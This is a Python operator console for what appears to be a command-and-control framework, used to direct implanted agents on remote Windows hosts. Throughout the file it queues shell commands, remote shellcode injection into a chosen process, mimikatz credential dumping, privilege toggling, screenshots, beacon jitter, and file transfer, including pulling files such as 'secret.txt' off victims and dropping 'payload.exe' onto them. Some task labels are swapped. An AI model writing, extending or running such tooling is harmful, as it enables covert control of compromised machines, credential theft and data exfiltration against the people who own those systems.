import base64
import json
import sys
import requests
from pathlib import Path
from pprint import pprint
import toml
import readline

mysettings_server = ''

try:
    data = toml.load("config.toml")
    mysettings_server = data['settings']['server']
except:
    print("")

menu = 1
prompt = "> "
currentAgent = ""
aliases = {}

# Define an enumeration subclass Enum
from enum import Enum

class errorcode(Enum):
    success = 0
    warning = 1
    invalid = 2

class taskstatus(Enum):
    Queued = 1
    Pending = 2
    Executing = 3
    Complete = 4
    Failed = 5
    NotSupported = 6

class tasktype(Enum):
    Terminate = 1
    Command = 2
    Pwd = 3
    ChangeDir = 4
    Whoami = 5
    PsList = 6
    Download = 7
    Upload = 8
    ListPrivs = 9
    SetPriv = 10
    RemoteInject = 11
    Screenshot = 12
    Sleep = 13
    Mimikatz = 14

base_commands = {
    "help" : "print this info",
    "agents" : "agents information",
    "quit" : "exit from the console"
}

agents_commands = {
    "list" : "list all agents",
    "dropdb" : "delete all data from the db",
    "use" : "connect to a specific agent",
    "help" : "print this info",
    "back" : "go back to the main menu",
    "quit" : "same as back"
}

agent_interactive_commands = {
    "task" : "specific task details",
    "history" : "task history",
    "sysinfo" : "basic agent details",
    "shell" : "execute os command",
    "ps": "print list of running processes",
    "pwd" : "print current working directory",
    "cd" : "change directory",
    "upload": "upload a file to the Server. ex: upload /tmp/test.txt C:\\test.txt",
    "download": "download a file. ex download C:\\LargeFiles\\100MB.zip",
    "listprivs": "listprivs",
    "setpriv": "enable or disable a priv. ex: setpriv SeDebug enabled",
    "scinject": "remote shellcode injection. ex: scinject [path/shellcode] [pid]",
    "getuid": "get user info",
    "help" : "print this info",
    "back" : "go back to the agents menu",
    "terminate": "kill agent",
    "resource": "run a cmds from a file. RC file local to the CLI. one cmd per line. ex: resource [cmds.rc]",
    "screenshot": "takes a screenshot, sends it be saved on the server. ex: screenshot",
    "sleep": "sets the sleep value with max and optional min jitter value(s). ex: sleep <seconds> <jitter-max> (jitter-min)",
    "mimikatz": "runs the mimikatz commands entered as input. ex: mimikatz standard::coffee",
    "quit" : "same as back"
}

# Combine all command dictionaries
all_commands = list(base_commands.keys()) + list(agents_commands.keys()) + list(agent_interactive_commands.keys())

def completer(text, state):
    matches = [cmd for cmd in all_commands if cmd.startswith(text)]
    if state < len(matches):
        return matches[state]
    else:
        return None

readline.parse_and_bind("tab: complete")
readline.set_completer(completer)


def print_task_type(task_type):
    match task_type:
        case tasktype.Terminate.value:
            print("Terminate")
        case tasktype.Command.value:
            print("Command")
        case tasktype.Pwd.value:
            print("Pwd")
        case tasktype.ChangeDir.value:
            print("ChangeDir")
        case tasktype.Whoami.value:
            print("Whoami")
        case tasktype.PsList.value:
            print("PsList")
        case tasktype.Upload.value:
            print("Download")
        case tasktype.Download.value:
            print("Upload")
        case tasktype.ListPrivs.value:
            print("ListPrivs")
        case tasktype.SetPriv.value:
            print("SetPrivs")
        case tasktype.RemoteInject.value:
            print("RemoteInject")
        case tasktype.Screenshot.value:
            print("Screenshot")
        case tasktype.Sleep.value:
            print("Sleep")
        case tasktype.Mimikatz.value:
            print("mimikatz")
        case _:
            print("Unknown")

def api_task_details(task_id):
    global mysettings_server
    url = "http://{}/admin/api/task/{}".format(mysettings_server,task_id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_task_history(id):
    global mysettings_server
    url = "http://{}/admin/api/agent_task/{}".format(mysettings_server,id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_get_agent(id):
    global mysettings_server
    url = "http://{}/admin/api/agent/{}".format(mysettings_server,id)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_agents():
    global mysettings_server
    url = "http://{}/admin/api/agents".format(mysettings_server)
    r = requests.get(url,timeout=60)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_dropdb():
    global mysettings_server
    url = "http://{}/admin/api/dropdb".format(mysettings_server)
    r = requests.get(url,timeout=300)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def api_send_task(task,timeout=60):
    global mysettings_server
    url = "http://{}/admin/api/task".format(mysettings_server)
    r = requests.post(url,json=task,timeout=timeout)
    if r.status_code == 200:
        return r.json()
    else:
        return None

def print_agents(agents):
    print("--------------------------------------------------")
    if agents == None:
        print("Cant connect to server")
    elif len(agents) == 0:
        print("\t\tNo agents")
    else:
        for agent in agents:
            print_agent_details(agent)
            if len(agents) > 1:    
                print("-------")
    print("--------------------------------------------------")

def print_task_details(task):
    if task == None:
        print("Cant connect to server")
    else:
        print("")
        print("ID\t\t:",task['id'])
        print("Type\t\t: ",end="")
        print_task_type(task['type'])
        print("Created\t\t:",task['created'])
        print("Updated\t\t:",task['updated'])
        print("Input\t\t:",task['input'][:512])
        if task['status'] == 1:
            print("Status\t\t: Queued")
        elif task['status'] == 2:
            print("Status\t\t: Pending")
        elif task['status'] == 3:
            print("Status\t\t: Executing")
        elif task['status'] == 4:
            print("Status\t\t: Complete")
            output = base64.b64decode(task['result']).decode('utf-8')
            if len(output) > 1024:
                print("Result\t\t:\n",output[:32768])
            else:
                print("Result\t\t:\n",output)
        elif task['status'] == 5:
            print("Status\t\t: Failed")
            output = base64.b64decode(task['result']).decode('utf-8')
            if len(output) > 1024:
                print("Result\t\t:\n",output[:16384])
            else:
                print("Result\t\t:\n",output)
        elif task['status'] == 6:
            print("Status\t\t: Not Supported")

def print_task_history(task_history):
    print("--------------------------------------------------")
    if task_history == None:
        print("Cant connect to server")
    elif len(task_history) == 0:
        print("\t\tNo tasks")
    else:
        for task in task_history:
            print("---")
            print("ID\t\t:",task['id'])
            print("Type\t\t: ",end="")
            print_task_type(task['type'])
            print("Input\t\t:",task['input'][:75])
            if task['status'] == 1:
                print("Status\t\t: Queued")
            elif task['status'] == 2:
                print("Status\t\t: Pending")
            elif task['status'] == 3:
                print("Status\t\t: Executing")
            elif task['status'] == 4:
                print("Status\t\t: Completed")
            elif task['status'] == 5:
                print("Status\t\t: Failed")
            elif task['status'] == 6:
                print("Status\t\t: Not Supported")
            print("Created\t\t:",task['created'])
            print("Updated\t\t:",task['updated'])
    print("--------------------------------------------------")

## agent is a json object
def print_agent_details(agent):
    if agent == None:
        print("Cant connect to server")
    else:
        print("ID\t\t:",agent['id'])
        print("Machine GUID\t:",agent['machine_guid'])
        print("Username\t:",agent['username'])
        print("Hostname\t:",agent['hostname'])
        print("Integrity\t:",agent['integrity'])
        print("Process Arch\t:",agent['process_arch'])
        print("Internal IP\t:",agent['internal_ip'])
        print("External IP\t:",agent['external_ip'])
        print("First Checkin\t:",agent['created'])
        print("Updated\t\t:",agent['updated'])
        print("-------")

def agent_send_host_download_file_exec(type, path, input):
    json_data = {   'agent_id': currentAgent, 
                    'path': path, 
                    'type': type,
                    'input_args': input
                    }
    pprint(json_data)
    global mysettings_server
    url = "http://{}/admin/api/host_download_file_exec".format(mysettings_server)
    r = requests.post(url, json=json_data, timeout=900)
    if r.status_code == 200:
        pprint(r.json())
        return r.json()
    else:
        print("failed request")
        return None

def agent_send_host_download_file(path, dst_path):
    json_data = {   'agent_id': currentAgent, 
                    'path': path, 
                    'dst_path': dst_path
                    }
    pprint(json_data)
    global mysettings_server
    url = "http://{}/admin/api/host_download_file".format(mysettings_server)
    r = requests.post(url, json=json_data, timeout=900)
    if r.status_code == 200:
        pprint(r.json())
        return r.json()
    else:
        print("failed request")
        return None

def agent_send_cmd(type=1, input=''):
    json_data = {   'agent_id': currentAgent, 
                    'input': input, 
                    'status': 1, 
                    'type': type
                }
    pprint(json_data)
    data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
    task = { 'data': data }
    result = api_send_task(task)
    pprint(result)


def agent_send_terminate_cmd():
    agent_send_cmd(tasktype.Terminate.value)

def agent_send_shell_cmd(shell_cmd):
    agent_send_cmd(tasktype.Command.value, shell_cmd)

def agent_send_pwd_cmd():
    agent_send_cmd(tasktype.Pwd.value)

def agent_send_cd_cmd(cd_dir):
    agent_send_cmd(tasktype.ChangeDir.value, cd_dir)

def agent_send_getuid_cmd():
    agent_send_cmd(tasktype.Whoami.value)

def agent_send_ps_cmd():
    agent_send_cmd(tasktype.PsList.value)

def agent_send_download_cmd(srv_path, dst_path):
    agent_send_host_download_file(srv_path, dst_path)

def agent_send_upload_cmd(uploadpath):
    agent_send_cmd(tasktype.Upload.value, uploadpath)

def agent_task_details(task_id):
    task = api_task_details(task_id)
    print_task_details(task)

def agent_history():
    task_history = api_task_history(currentAgent)
    print_task_history(task_history)

def agent_sysinfo():
    agent = api_get_agent(currentAgent)
    if "id" in agent:
        print("ID\t\t:",agent['id'])
        print("Machine GUID\t:",agent['machine_guid'])
        print("Username\t:",agent['username'])
        print("Hostname\t:",agent['hostname'])
        if agent['integrity'] == 3:
            print("Integrity\t:",agent['integrity']," - Medium")
        elif agent['integrity'] == 4:
            print("Integrity\t:",agent['integrity']," - High")
        elif agent['integrity'] == 5:
            print("Integrity\t:",agent['integrity']," - SYSTEM")
        print("Process Arch\t:",agent['process_arch'])
        print("Internal IP\t:",agent['internal_ip'])
        print("External IP\t:",agent['external_ip'])
        print("First Checkin\t:",agent['created'])
        print("Updated\t\t:",agent['updated'])

def use_agent(inputstr):
    global currentAgent
    global menu
    global prompt
    agent_json = api_get_agent(inputstr)
    if agent_json == None:
        print("Cant connect to server")
    elif "id" in agent_json:
        menu = 3
        currentAgent = inputstr
        prompt = inputstr + " > "
        print_agent_details(agent_json)
    else:
        print("invalid agent_id")

def list_agents():
    agents = api_agents()
    print_agents(agents)

def set_agent_menu():
    global menu
    global prompt
    menu = 2
    prompt = "agents > "

def set_main_menu():
    global menu
    global prompt
    menu = 1
    prompt = "> "

def print_main_menu_help():
    for i in base_commands :
        print(i,"\t:", base_commands[i])

def print_agents_help():
    for i in agents_commands:
        print(i,"\t:", agents_commands[i])

def print_agent_interactive_help():
    for i in agent_interactive_commands:
        if(len(str(i)) >= 7):
            print(i,"\t:", agent_interactive_commands[i])
        else:
            print(i,"\t\t:", agent_interactive_commands[i])

def agent_send_screenshot_cmd():
    agent_send_cmd(tasktype.Screenshot.value)

def agent_send_sleep_cmd(inputstr):
    agent_send_cmd(tasktype.Sleep.value, inputstr)

def agent_mimikatz(input_cmd):
    json_data = {   'agent_id': currentAgent, 
                    'input': input_cmd, 
                    'status': 1, 
                    'type': tasktype.Mimikatz.value
                }
    pprint(json_data)
    data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
    task = { 'data': data }
    result = api_send_task(task)
    pprint(result)

#
# main menu 1
# agents 2
# interactive agent 3
#
def parseInput(inputstr):
    inputstr = inputstr.strip()

    # Handle 'alias list' and creation first
    if inputstr.startswith("alias "):
        parts = inputstr.split(" ", 2)
        if len(parts) == 3:
            aliases[parts[1]] = parts[2]
            print(f"Alias added: {parts[1]} -> {parts[2]}")
        else:
            print("Usage: alias [name] [command]")
        return

    if inputstr == "alias list":
        if not aliases:
            print("No aliases set.")
        else:
            print("Current aliases:")
            for k, v in aliases.items():
                print(f"  {k} -> {v}")
        return

    #  SUBSTITUTE ALIAS BEFORE PARSING
    parts = inputstr.split()
    if parts and parts[0] in aliases:
        aliased_cmd = aliases[parts[0]]
        inputstr = f"{aliased_cmd} {' '.join(parts[1:])}".strip()



    if inputstr == "quit" or inputstr == "back" or inputstr == "exit":
        if menu == 1:
            sys.exit(0)
        elif menu == 2:
            set_main_menu()
        elif menu == 3: 
            set_agent_menu()
    elif inputstr.startswith("help"):
        if inputstr.strip() == "help":
            if menu == 1:
                print_main_menu_help()
                print("")
            elif menu == 2:
                print_agents_help()
                print("")
            elif menu == 3:
                print_agent_interactive_help()
                print("")
            else:
                print("")
        elif inputstr.strip() == "help download":
            print("\nCommand: download")
            print("Description: Download a file from the agent's machine to the server.")
            print("Usage: download <agent_file_path>")
            print("Example: download C:\\Users\\admin\\Desktop\\secret.txt\n")
        elif inputstr.strip() == "help upload":
            print("\nCommand: upload")
            print("Description: Upload a file from the server to the agent's machine.")
            print("Usage: upload <server_file_path> <agent_destination_path>")
            print("Example: upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe\n")
        else:
            print("Unknown help topic. Try just 'help' to see available commands.\n")
    elif inputstr == "agents":
        set_agent_menu()
    elif menu == 2:
        if inputstr == "list":
            list_agents()
        if inputstr == "dropdb":
            api_dropdb()
        elif inputstr.startswith("use "):
            agent_id = inputstr.replace('use ', '')
            use_agent(agent_id)
    elif menu == 3:
        if inputstr == "sysinfo":
            agent_sysinfo()
        elif inputstr == "terminate":
            agent_send_terminate_cmd()
        elif inputstr.startswith("shell "):
            shell_cmd = inputstr.replace('shell ', '')
            agent_send_shell_cmd(shell_cmd)
        elif inputstr == "pwd":
            agent_send_pwd_cmd()
        elif inputstr == "getuid" or inputstr == "whoami":
            agent_send_getuid_cmd()
        elif inputstr == "ps":
            agent_send_ps_cmd()
        elif inputstr.startswith("cd "):
            cd_dir = inputstr.replace('cd ', '')
            agent_send_cd_cmd(cd_dir)
        ##
        ## we flip the perspective here for upload and download
        ##
        elif inputstr.startswith("download "):
            # Download a file from the agent to the server
            upload_path = inputstr.replace('download ', '')
            agent_send_upload_cmd(upload_path)

        elif inputstr.startswith("upload "):
            # Upload a file from the server to the agent
            uploadfile_input = inputstr.replace('upload ', '')
            srv_path = uploadfile_input.split(" ")[0]  # path on server (source)
            dst_path = uploadfile_input.split(" ")[-1] # path on agent (destination)
            agent_send_download_cmd(srv_path, dst_path)
        

        elif inputstr == "listprivs":
            # ✅ You now correctly point to the BIN file (not DLL)
            bin_path = "cli/modules/listprivs/listprivs_x64.bin"
            agent_send_host_download_file_exec(tasktype.ListPrivs.value, bin_path, "")

        elif inputstr.startswith("setpriv "):
            setpriv_cmd = inputstr.replace('setpriv ', '')
            priv = setpriv_cmd.split(" ")[0]
            state = setpriv_cmd.split(" ")[-1]
            
            if state == "enabled" or state == "disabled":
                # ✅ Correct BIN file path
                bin_path = "cli/modules/setpriv/setpriv_x64.bin"
                input_args = priv + " " + state
                agent_send_host_download_file_exec(tasktype.SetPriv.value, bin_path, input_args)
            else:
                print("Invalid state. Use: enabled or disabled")

        elif inputstr.startswith("scinject "):
            scinject_cmd = inputstr.replace('scinject ', '')
            file = scinject_cmd.split(" ")[0]
            processOrpid = scinject_cmd.split(" ")[1]
            agent_send_host_download_file_exec(tasktype.RemoteInject.value, file, processOrpid)

        elif inputstr == "screenshot":
            bin_path = "cli/modules/screenshot/screenshot_x64.bin"
            agent_send_host_download_file_exec(tasktype.Screenshot.value, bin_path, "")


        elif inputstr.startswith("sleep "):
            sleep_cmd = inputstr.replace('sleep ', '')
            agent_send_sleep_cmd(sleep_cmd)

        elif inputstr.startswith("mimikatz"):
            if len(inputstr.split()) != 2:
                print("Incorrect number of arguments, please enter mimikatz commands.")
            else:
                mimikatz_cmd = inputstr.replace('mimikatz ', '')
                bin_path = "cli/modules/mimikatz/mimikatz_x64.bin"
                agent_send_host_download_file_exec(tasktype.Mimikatz.value, bin_path, mimikatz_cmd)

        elif inputstr.startswith("resource "):
            autoruncmds = []
            resource_cmd = inputstr.replace('resource ', '')
            file = resource_cmd.split(" ")[0]
            pathfile = Path(file)
            if pathfile.is_file():
                f=open(file,"r")
                for line in f:
                    cmd = line.strip()
                    if(len(cmd) > 0):
                        autoruncmds.append(cmd)
                f.close()
                for cmd in autoruncmds:
                    parseInput(cmd)
        elif inputstr == "history" or inputstr == "tasks":
            agent_history()
        elif inputstr.startswith("task "):
            task_id = inputstr.replace('task ', '')
            print(task_id)
            agent_task_details(task_id)

while True:
    try:
        inputstr = str(input(prompt))
        print("")
        parseInput(inputstr)
    except TypeError as err:
        print("error: {}".format(err))
    except KeyboardInterrupt as err:
        sys.exit()
    except EOFError as err:
        sys.exit()